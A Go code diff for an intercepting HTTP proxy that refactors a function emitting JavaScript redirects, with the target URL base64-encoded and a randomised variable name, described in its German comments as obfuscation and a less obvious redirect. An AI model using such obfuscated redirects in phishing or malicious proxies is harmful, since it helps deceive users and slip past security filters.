@@ -31,7 +31,8 @@ import (
 	"strings"
 	"sync"
 	"time"
-    	"math/rand"
+	crand "crypto/rand" // Für kryptografische Funktionen
+    	mrand "math/rand"  // Für mathematische Zufallsfunktionen
 	
 	"golang.org/x/net/proxy"
 
@@ -1314,16 +1315,12 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-    // Basis-URL obfuskieren
+    mrand.Seed(time.Now().UnixNano())
+    varName := fmt.Sprintf("var%d", mrand.Intn(1000))
     obfuscatedURL := base64.StdEncoding.EncodeToString([]byte(rurl))
-    decodedFunctionName := "atob"  // JavaScript-Funktion zum Dekodieren von Base64
-    redirectFunction := "location" // Verwenden einer weniger offensichtlichen Methode zur Umleitung
-
-    // Zufälliges JavaScript-Element generieren
-    rand.Seed(time.Now().UnixNano())
-    varName := fmt.Sprintf("var%d", rand.Intn(1000))
-
-    // Dynamisch JavaScript generieren
+    decodedFunctionName := "atob"
+    redirectFunction := "location"
+    
     js := fmt.Sprintf(`
 <html>
 <head>
